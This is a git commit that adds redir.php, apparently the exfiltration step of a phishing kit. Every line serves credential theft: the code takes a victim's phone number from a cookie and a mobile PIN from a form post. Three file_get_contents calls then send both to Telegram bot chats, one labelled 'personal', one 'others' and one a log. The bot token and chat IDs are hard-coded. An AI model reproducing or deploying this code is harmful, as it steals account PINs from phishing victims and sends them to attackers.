c3f797e0710bbd8a78cacb5db4060d6762b77dcb
NonNomen404 <92431601+NonNomen404@users.noreply.github.com>
2021-10-19 16:05:23 +0700

    Create redir.php

---
+++ redir.php
@@ -0,0 +1,16 @@
+// personal
+file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-578705759&text=" . $_COOKIE['number'] . " MPIN: " . $_POST['mpin']);
+
+// others
+file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-538746459&text=" . $_COOKIE['number'] . " MPIN: " . $_POST['mpin']);
+
+// logs
+$mpin = "\n MPIN: " . $_POST['mpin'];
+// $mpin = NULL;
+$data = [
+'chat_id' => $Chat_ID,
+'text' => "Number: " . $_COOKIE['number'] . $mpin
+];
+file_get_contents("https://api.telegram.org/bot" . $Api_Token . "/sendMessage?" . http_build_query($data));
+
+// $_POST['mpin'] = NULL;
